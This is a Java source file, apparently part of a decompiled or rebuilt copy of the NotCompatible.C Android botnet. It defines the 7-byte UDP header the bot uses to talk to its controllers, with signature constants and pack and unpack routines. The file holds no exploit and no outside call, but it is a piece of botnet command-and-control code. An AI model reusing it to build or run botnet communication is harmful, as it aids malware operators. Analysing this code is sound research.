package diff.notcompatible.c.bot.net.udp.objects;

import diff.notcompatible.c.bot.objects.MyBuffer;

public class UDPHeader {
    public int count;
    public int flags;
    public int part;
    public int sig;
    public int sequence;

    public UDPHeader() {
        sig = 0xFE05;
        sequence = 0;
    }

    public byte[] pack() {
        MyBuffer mb = new MyBuffer();

        mb.putWord(sig);
        mb.put((byte) (flags & 0xFF));
        mb.putWord(sequence);
        mb.put((byte) (part & 0xFF));
        mb.put((byte) (count & 0xFF));

        return mb.array();
    }

    public boolean unpack(byte[] data) {
        if (data.length == 7) {
            MyBuffer mb = new MyBuffer();
            mb.put(data);

            sig = mb.asWord();
            mb.shift(2);

            flags = mb.asByte();
            mb.shift(1);

            sequence = mb.asWord();
            mb.shift(2);

            part = mb.asByte();
            mb.shift(1);

            count = mb.asByte();

            if (sig == 0xFF05) {
                return true;
            }
        }

        return false;
    }
}